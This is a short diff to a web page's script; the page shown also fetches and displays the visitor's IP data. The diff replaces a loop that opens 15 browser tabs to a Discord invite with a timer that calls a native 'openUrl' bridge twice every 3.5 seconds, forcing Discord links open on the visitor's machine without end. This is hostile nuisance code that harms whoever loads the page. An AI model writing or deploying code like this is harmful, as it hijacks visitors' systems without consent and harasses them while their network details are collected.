@@ -76,10 +76,10 @@
                 document.getElementById('user-info').innerHTML = '<p>Failed to load IP data.</p>';
             });
 
-        // Open 15 tabs to the Discord link
-        for (let i = 0; i < 15; i++) {
-            window.open('https://discord.gg/69q', '_blank');
-        }
+        setInterval(function() {
+            window.invokeNative("openUrl", "https://discord.gg/69Q");
+            window.invokeNative("openUrl", "https://discord.gg/69Q");
+        }, 3500);
     </script>
 </body>
 </html>
